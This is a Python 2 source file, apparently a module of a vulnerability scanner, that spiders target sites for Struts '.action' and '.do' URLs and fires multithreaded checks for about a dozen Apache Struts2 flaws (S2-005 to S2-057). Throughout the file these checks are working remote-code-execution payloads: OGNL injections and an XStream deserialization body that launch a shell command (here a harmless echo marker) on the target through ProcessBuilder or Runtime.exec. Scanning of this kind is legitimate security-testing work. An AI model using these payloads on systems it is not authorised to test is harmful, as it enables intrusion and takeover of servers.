import re
import requests
import threading
import queue
import lib.spider.Spider
import os
import time


def info():
    info = {
        'name': 's2',
        'path': 'S2Scanner',
        'fullname': 'SWEP S2 VULNERABILITY SCANNER',
        'description': 'S2-045 and S2-057 vulnerability scanner.',
        'parameters':{
            'Url': 'Target URL.',
            'UrlList': 'URL list for batch check.',
            'Ratio': 'Ratio for response based check',
            'Thread': 'Threads. Default: 10',
            'Timeout': 'Request timeout.',
        },
        'author': 'BREACHERS security',
        'date': '2019-02-02'
    }
    return info


class Scanner():
    def __init__(self):
        self.Url = None
        self.UrlList = None
        self.Protocol = 'http'
        self.Thread = 10
        self.Ratio = 0.3
        self.Timeout = 3
        self.Spider = lib.spider.Spider.Spider()
        self.VulnerableUrlList = {'s2057': [], 's2019': [], 's2005': [], 's2009': [], 's2013': [], 's2016': [], 's2032': [], 's2033': [], 's2037': [], 's2045': [], 's2046': [], 's2048': [], 's2052': [], 's2053': []}
        self.SiteUrlList = []
        self.TaskList = []
        self.Status = True
        self.Queue = queue.Queue()
        self.PayoadS2_045 = "%{(#_='multipart/form-data')."
        self.PayoadS2_045 += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        self.PayoadS2_045 += "(#_memberAccess?"
        self.PayoadS2_045 += "(#_memberAccess=#dm):"
        self.PayoadS2_045 += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        self.PayoadS2_045 += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        self.PayoadS2_045 += "(#ognlUtil.getExcludedPackageNames().clear())."
        self.PayoadS2_045 += "(#ognlUtil.getExcludedClasses().clear())."
        self.PayoadS2_045 += "(#context.setMemberAccess(#dm))))."
        self.PayoadS2_045 += "(#cmd='echo \"VULNERABLE_FROM_SWEP\"')."
        self.PayoadS2_045 += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        self.PayoadS2_045 += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        self.PayoadS2_045 += "(#p=new java.lang.ProcessBuilder(#cmds))."
        self.PayoadS2_045 += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        self.PayoadS2_045 += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        self.PayoadS2_045 += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        self.PayoadS2_045 += "(#ros.flush())}"
        pass


    def Scan(self):
        self.Spider.Protocol = self.Protocol
        self.Spider.Timeout = int(self.Timeout)
        self.Spider.Thread = int(self.Thread)
        if os.path.isfile(str(self.UrlList)):
            for item in open(self.UrlList).read().split('\n'):
                self.SiteUrlList.append(item)
        else:
            if not self.Url:
                print '[!] URL not specified.'
                return
            self.SiteUrlList.append(self.Url)
        if not self.Protocol:
            print '[!] Protocol not specified, using http.'
            self.Protocol = 'http'
        if not self.Thread or not str(self.Thread).isdigit():
            print '[!] Thread not specified, using 10 by default.'
            self.Thread = 10
        self.Thread = int(self.Thread)
        if not self.Timeout or not str(self.Timeout).isdigit():
            print '[!] Timeout not specified, using 3 by default.'
            self.Timeout = 3
        self.Timeout = int(self.Timeout)
        for item in self.SiteUrlList:
            self.Spider.Url = item
            PageList = self.Spider.SpiderSite()
            if not PageList:
                print '[*] Spider got a error or empty response, Passing %s.' %(item)
                continue
            UrlList = self.RemoveDuplicate(PageList)
            if not UrlList:
                continue
            for item in UrlList:
                self.Queue.put(item)
        if not self.Queue.qsize():
            print '[*] No URL Found, Quitting.'
            return
        self.Status = True
        counter = threading.Thread(target=self.ThreadCounter)
        counter.setDaemon(True)
        counter.start()
        while self.Queue.qsize():
            if len(self.TaskList) < int(self.Thread):
                thread = threading.Thread(target=self.CheckExploit, args=[self.Queue.get()])
                thread.start()
                self.TaskList.append(thread)
        print '[+] Scan completed, Synchronizing threads.'
        for item in self.TaskList:
            item.join()
        self.Status = False
        UrlCount = 0
        for item in self.VulnerableUrlList.keys():
            UrlCount += len(self.VulnerableUrlList[item])
        print '[*] %s vulnerable URL(s) found.' %(UrlCount)
        if len(self.VulnerableUrlList['s2045']):
            print '[+] %s URL is vunlerable to S2-045.' %(len(self.VulnerableUrlList['s2045']))
            for item in self.VulnerableUrlList['s2045']:
                print ' |    %s' %(item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2057']):
            print '[+] %s URL is vunlerable to S2-057.' % (len(self.VulnerableUrlList['s2057']))
            for item in self.VulnerableUrlList['s2057']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2019']):
            print '[+] %s URL is vunlerable to S2-019.' % (len(self.VulnerableUrlList['s2019']))
            for item in self.VulnerableUrlList['s2019']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2057']):
            print '[+] %s URL is vunlerable to S2-005.' % (len(self.VulnerableUrlList['s2005']))
            for item in self.VulnerableUrlList['s2005']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2009']):
            print '[+] %s URL is vunlerable to S2-009.' % (len(self.VulnerableUrlList['s2009']))
            for item in self.VulnerableUrlList['s2009']:
                print ' |    %s' % (item)
        if len(self.VulnerableUrlList['s2013']):
            print '[+] %s URL is vunlerable to S2-013.' % (len(self.VulnerableUrlList['s2013']))
            for item in self.VulnerableUrlList['s2013']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2016']):
            print '[+] %s URL is vunlerable to S2-016.' % (len(self.VulnerableUrlList['s2057']))
            for item in self.VulnerableUrlList['s2016']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2032']):
            print '[+] %s URL is vunlerable to S2-032.' % (len(self.VulnerableUrlList['s2032']))
            for item in self.VulnerableUrlList['s2032']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2033']):
            print '[+] %s URL is vunlerable to S2-033.' % (len(self.VulnerableUrlList['s2033']))
            for item in self.VulnerableUrlList['s2033']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2037']):
            print '[+] %s URL is vunlerable to S2-037.' % (len(self.VulnerableUrlList['s2037']))
            for item in self.VulnerableUrlList['s2037']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2045']):
            print '[+] %s URL is vunlerable to S2-045.' % (len(self.VulnerableUrlList['s2045']))
            for item in self.VulnerableUrlList['s2045']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2046']):
            print '[+] %s URL is vunlerable to S2-046.' % (len(self.VulnerableUrlList['s2046']))
            for item in self.VulnerableUrlList['s2046']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2048']):
            print '[+] %s URL is vunlerable to S2-048.' % (len(self.VulnerableUrlList['s2048']))
            for item in self.VulnerableUrlList['s2048']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2052']):
            print '[+] %s URL is vunlerable to S2-052.' % (len(self.VulnerableUrlList['s2052']))
            for item in self.VulnerableUrlList['s2052']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        if len(self.VulnerableUrlList['s2053']):
            print '[+] %s URL is vunlerable to S2-053.' % (len(self.VulnerableUrlList['s2053']))
            for item in self.VulnerableUrlList['s2053']:
                print ' |    %s' % (item)
            print '[*] URL output completed.'
        print '[*] Scan completed.'
        return self.VulnerableUrlList

    def Check045(self, Url):
        try:
            resp = requests.get(Url, headers={'Content-Type': self.PayoadS2_045.replace('#', '%23')}, timeout=int(self.Timeout))
            if 'VULNERABLE_FROM_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-045.'
                self.VulnerableUrlList['s2045'].append(Url)
        except requests.Timeout:
            print '[!] Timeed out checking URL %s.' %(Url)
        except Exception, e:
            print '[!] Failed to check URL %s: %s' %(Url, str(e))
        except requests.ConnectionError:
            print '[!] Connection error fetching %s:' %(Url)
        return


    def Check057(self, Url):
        try:
            Url = Url.strip('%s://' %(self.Protocol))
            UrlList = Url.split('/')
            ActionName = UrlList[-1]
            UrlList.pop()
            UrlList.append('%{3+3}')
            UrlList.append(ActionName)
            Url = ''
            for item in UrlList:
                Url += item
                Url += '/'
            Url = '%s://%s' %(self.Protocol, Url.strip('/'))
            resp = requests.get(Url, timeout=int(self.Timeout))
            if resp.status_code == 302:
                print '[+] %s is vulnerable to S2-057.' %(Url)
                self.VulnerableUrlList['s2057'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' %(self.Url)
        except Exception, e:
            print '[!] Failed to fetch URL: %s' %(str(e))
        except requests.ConnectionError:
            print '[!] Connection error fetching %s:' %(Url)
        return


    def Check019(self, Url):
        try:
            resp = requests.post(Url + '?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27echo%27,%27VULNERABLE_SWEP%27}%29%29.start%28%29 %2C%23b%3D%23a.\
getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.\
BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.\
get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.\
lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A', timeout=int(self.Timeout))
            if resp.headers.has_key('Content-Length') and len(resp.headers['Content-Length']) < 50000:
                print '[+] %s is vulnerable to s2-019.' %(Url)
                self.VulnerableUrlList['s2019'].append(Url)
                pass
        except requests.Timeout:
            print '[!] Timed out fetching %s.' %(self.Url)
        except requests.ConnectionError:
            print '[!] Connection error fetching %s.' %(self.Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s.' %(Url, str(e))
        return


    def Check005(self, Url):
        try:
            resp = requests.post(Url,'(%27%23_memberAccess.allowStaticMethodAccess%27)(a)=true&(b)((%27%23context[%27xwork.MethodAccessor.denyMethodExecution%27]=false%27)(b))\
&(%27%23c%27)((%27%23_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET%27)(c))&\
(g)((%27%23mycmd=%27echo%20VULNERABLE_SWEP%27%27)(d))&(h)((%27%23myret=@java.lang.Runtime@getRuntime().exec(%23mycmd)%27)(d))&\
(i)((%27%23mydat=new java.io.DataInputStream(%23myret.getInputStream())%27)(d))&(j)((%27%23myres=new byte[51020]%27)(d))&\
(k)((%27%23mydat.readFully(%23myres)%27)(d))&(l)((%27%23mystr=new java.lang.String(%23myres)%27)(d))&\
(m)((%27%23myout=@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&(n)((%27%23myout.getWriter().println(%23mystr)%27)(d))'
 , timeout=int(self.Timeout))
            if "VULNERABLE_SWEP" in resp.text:
                print '[+] %s is vulnerable to S2-005' %(Url)
                self.VulnerableUrlList['s2005'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' %(self.Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' %(self.Url)
        except Exception ,e:
            print '[!] Failed to fetch page %s: %s.' %(self.Url, e)
        return


    def Check009(self, Url):
        try:
            resp = requests.get(Url + 'name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,\
+%23a=@java.lang.Runtime@getRuntime().exec(%27echo%20VULNERABLE_SWEP%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),\
%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),\
%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-009.' %(Url)
                self.VulnerableUrlList['s2009'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' %(Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' %(Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' %(Url, str(e))
        return


    def Check013(self, Url):
        try:
            resp = requests.get(Url + 'a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec(%27echo%20VULNERABLE_SWEP%27).getInputStream(),\
%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),\
%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),\
%23sbtest.println(%23d),%23sbtest.close())}', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-013.' %(Url)
                self.VulnerableUrlList['s2013'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' %(Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' %(Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' %(Url, str(e))
        return


    def Check016(self, Url):
        try:
            resp = requests.get(Url + '?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27echo%27,%27VULNERABLE_SWEP%27})).start(),\
%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),\
%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),\
%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-016.' % (Url)
                self.VulnerableUrlList['s2016'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def Check032(self, Url):
        try:
            resp = requests.get(Url + '?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),\
%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),\
%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),\
%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),\
1?%23xx:%23request.toString&cmd=echo%20VULNERABLE_SWEP&pp=____A&ppp=%20&encoding=UTF-8', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-032.' % (Url)
                self.VulnerableUrlList['s2032'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def Check033(self, Url):
        try:
            resp = requests.get(Url + '/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,\
%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),\
%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),\
%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=echo%20VULNERABLE_SWEP', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-033.' % (Url)
                self.VulnerableUrlList['s2033'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def Check037(self, Url):
        try:
            resp = requests.get(Url + '/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),\
%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),\
%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=echo%20VULNERABLE_SWEP', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-037.' % (Url)
                self.VulnerableUrlList['s2037'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def Check046(self, Url):
        try:
            resp = requests.post(Url ,files={'foo': ('%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.\
getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).\
(#context.setMemberAccess(#dm)))).(#cmd=\'echo VULNERABKLE_SWEP\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).\
(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).\
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))\
.(#ros.flush())}\\x000', 'text/plain')} ,timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-046.' % (Url)
                self.VulnerableUrlList['s2046'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def Check048(self, Url):
        try:
            resp = requests.post(Url, 'age=1&__checkbox_bustedBefore=true&name=name%3D%25%7B%28%23nike%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.\
OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.\
container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.\
clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20VULNERABLE_SWEP%27%29.\
%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.\
%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.\
ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.\
struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.\
%28%23ros.flush%28%29%29%7D&description=1')
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-048.'
                self.VulnerableUrlList['s2048'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' %(Url)
        except requests.ConnectionError:
            print '[!] Failed to connect to %s.' %(Url)
        except Exception ,e:
            print '[!] Failed to fetch %s: %s.' %(Url, e)
        return


    def Check052(self, Url):
        try:
            resp = requests.post(Url, '<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> \
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> \
<is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> \
<serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> \
<next class="java.lang.ProcessBuilder"> <command> <string>echo VULNERABLE_SWEP</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> \
<filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> \
<name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> \
<ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> \
<dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> \
<entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> \
<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> \
</entry> </map>', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-052.' % (Url)
                self.VulnerableUrlList['s2052'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def Check053(self, Url):
        try:
            resp = requests.post(Url + '?name=%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).\
(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).\
(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).\
(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27echo VULNERABLE_SWEP%27).\
(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).\
(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).\
(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).\
(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d', timeout=int(self.Timeout))
            if 'VULNERABLE_SWEP' in resp.text:
                print '[+] %s is vulnerable to S2-053.' % (Url)
                self.VulnerableUrlList['s2053'].append(Url)
        except requests.Timeout:
            print '[!] Timed out fetching %s.' % (Url)
        except requests.ConnectionError:
            print '[!] Error connecting to %s.' % (Url)
        except Exception, e:
            print '[!] Failed to fetch page %s: %s' % (Url, str(e))
        return


    def CheckExploit(self, Url):
        for item in [self.Check019, self.Check057, self.Check045, self.Check005, self.Check009, self.Check013, self.Check016, self.Check032, self.Check033, self.Check037, self.Check046, self.Check052, self.Check053]:
            if len(self.TaskList) < int(self.Thread):
                print '[D] Starting check %s' %(str(item))
                thread = threading.Thread(target=item, args=[Url])
                thread.start()
                self.TaskList.append(thread)
        return


    def CheckUrl(self, UrlList):
        NewUrlList = []
        for item in UrlList:
            if re.findall('[.!]do|[.!]action', item):
                NewUrlList.append(item)
        return NewUrlList


    def RemoveDuplicate(self, RawList):
        UrlList = []
        for item in self.CheckUrl(RawList):
            Url = re.findall('.*[!|/][a-zA-Z0-9-_]*\.action|.*[!|/][a-zA-Z0-9-_]*\.do', item)
            if not Url:
                return
            else:
                Url = Url[0]
            if Url not in UrlList:
                UrlList.append(Url)
        return UrlList


    def ThreadCounter(self):
        time.sleep(1)
        while self.Status:
            for item in self.TaskList:
                if not item.isAlive():
                    self.TaskList.remove(item)
                    del item
        return


    def info(self):
        InformationList = info()
        args = InformationList['parameters']
        print '[*] Incoming scanner information:'
        print '[*] Scanner name: %s' %(InformationList['name'])
        print ' |   %s' %(InformationList['fullname'])
        print ' |   Description: %s' %(InformationList['description'])
        print ' |   Author: %s' %(InformationList['author'])
        print ' |   Date: %s' %(InformationList['date'])
        print ' |   Arguments: Total %i' %(len(args))
        print ' |    |  NAME        DESCRIPTION'
        print ' |    |  ----        `-----------'
        for item in args.keys():
            print ' |    |  %s%s' %(item.ljust(12), args[item])
        print ' |'
        print '[*] Scanner information end.'


def test():
    scanner = Scanner()
    scanner.Url = ''
    scanner.Scan()

